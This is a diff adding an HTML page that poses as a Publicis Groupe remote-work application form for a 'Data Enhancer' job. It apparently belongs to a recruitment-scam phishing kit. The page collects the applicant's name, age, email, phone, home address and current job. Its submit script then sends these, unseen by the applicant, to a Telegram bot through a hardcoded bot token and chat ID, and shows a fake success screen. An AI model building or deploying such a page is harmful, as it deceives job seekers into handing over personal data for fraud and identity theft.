@@ -1,0 +1,197 @@
+
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Publicis Groupe Remote Work Application</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+      background: #f5f5f5;
+    }
+    .container {
+      max-width: 800px;
+      margin: auto;
+      background: #fff;
+      padding: 30px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h2 {
+      text-align: center;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    input, textarea, select {
+      width: 100%;
+      padding: 8px;
+      margin-top: 5px;
+    }
+    canvas {
+      border: 1px solid #ccc;
+      width: 100%;
+      height: 200px;
+      touch-action: none;
+    }
+    .btn {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background: #007bff;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .logo {
+      width: 200px;
+      display: block;
+      margin: auto;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="formContainer">
+    <img class="logo" src="Logo.png" alt="Publicis Groupe Logo" />
+    <h2>Publicis Groupe Remote Work Application</h2>
+
+    <form id="applicationForm">
+      <label>Position Applied For: <input type="text" value="Data Enhancer" readonly></label>
+      <label>Full Name: <input type="text" required></label>
+      <label>Age: <input type="number" required></label>
+      <label>Email Address: <input type="email" required></label>
+      <label>Phone Number: <input type="tel" required></label>
+      <label>Residential Address (including State and Zip): <input type="text" required></label>
+      <label>Current Job: <input type="text"></label>
+      <label>Preferred Start Date: <input type="text" id="startDate" required></label>
+
+      <label>Do you have a reliable internet connection for remote work?
+        <select required><option>Yes</option><option>No</option></select>
+      </label>
+      <label>Are you able to self-manage and manage time remotely?
+        <select required><option>Yes</option><option>No</option></select>
+      </label>
+      <label>Primary Work Time Zone: <input type="text" required></label>
+
+      <label>Relevant Work Experience:
+        <textarea rows="3"></textarea>
+      </label>
+      <label>Key Skills and Software Tools:
+        <textarea rows="3"></textarea>
+      </label>
+
+      <label>Signature (please sign below):</label>
+      <canvas id="signature" width="600" height="200"></canvas>
+      <button type="button" class="btn" onclick="clearSignature()">Clear Signature</button>
+
+      <label>Date: <input type="text" id="signDate" required></label>
+
+      <button type="button" class="btn" onclick="submitForm()">Submit</button>
+    </form>
+  </div>
+
+  <script>
+    flatpickr("#startDate", { dateFormat: "Y-m-d" });
+    flatpickr("#signDate", { dateFormat: "Y-m-d" });
+
+    const canvas = document.getElementById('signature');
+    const ctx = canvas.getContext('2d');
+    let drawing = false;
+
+    canvas.addEventListener('mousedown', startDraw);
+    canvas.addEventListener('mouseup', stopDraw);
+    canvas.addEventListener('mouseout', stopDraw);
+    canvas.addEventListener('mousemove', draw);
+
+    canvas.addEventListener('touchstart', (e) => startDraw(e.touches[0]));
+    canvas.addEventListener('touchend', stopDraw);
+    canvas.addEventListener('touchcancel', stopDraw);
+    canvas.addEventListener('touchmove', (e) => {
+      e.preventDefault();
+      draw(e.touches[0]);
+    });
+
+    function startDraw(e) {
+      drawing = true;
+      ctx.beginPath();
+      ctx.moveTo(e.offsetX || e.clientX - canvas.getBoundingClientRect().left,
+                 e.offsetY || e.clientY - canvas.getBoundingClientRect().top);
+    }
+
+    function stopDraw() {
+      drawing = false;
+    }
+
+    function draw(e) {
+      if (!drawing) return;
+      const x = e.offsetX || e.clientX - canvas.getBoundingClientRect().left;
+      const y = e.offsetY || e.clientY - canvas.getBoundingClientRect().top;
+      ctx.lineTo(x, y);
+      ctx.stroke();
+    }
+
+    function clearSignature() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+    }
+
+    function submitForm() {
+      const form = document.getElementById("applicationForm");
+      const data = {
+        fullName: form.elements[1].value,
+        age: form.elements[2].value,
+        email: form.elements[3].value,
+        phone: form.elements[4].value,
+        address: form.elements[5].value,
+        currentJob: form.elements[6].value,
+        startDate: form.elements[7].value,
+      };
+
+      const message = `
+🚀 新的工作申请已收到:
+👤 姓名: ${data.fullName}
+🎂 年龄: ${data.age}
+📧 邮箱: ${data.email}
+📱 电话: ${data.phone}
+🏠 地址: ${data.address}
+💼 当前工作: ${data.currentJob}
+🗓️ 期望开始日期: ${data.startDate}
+`;
+
+      const botToken = '8137953882:AAEI_rqRkue1BqwYFl_hm4xfdiWQUIZhsgw';
+      const chatId = '1469322043';
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+
+      document.body.innerHTML = `
+        <div class="container">
+          <img class="logo" src="Logo.png" alt="Publicis Groupe Logo" />
+          <h2>Application Submitted Successfully</h2>
+          <p><strong>Name:</strong> ${data.fullName}</p>
+          <p><strong>Age:</strong> ${data.age}</p>
+          <p><strong>Email:</strong> ${data.email}</p>
+          <p><strong>Phone:</strong> ${data.phone}</p>
+          <p><strong>Address:</strong> ${data.address}</p>
+          <p><strong>Current Job:</strong> ${data.currentJob}</p>
+          <p><strong>Preferred Start Date:</strong> ${data.startDate}</p>
+        </div>
+      `;
+    }
+  </script>
+</body>
+</html>
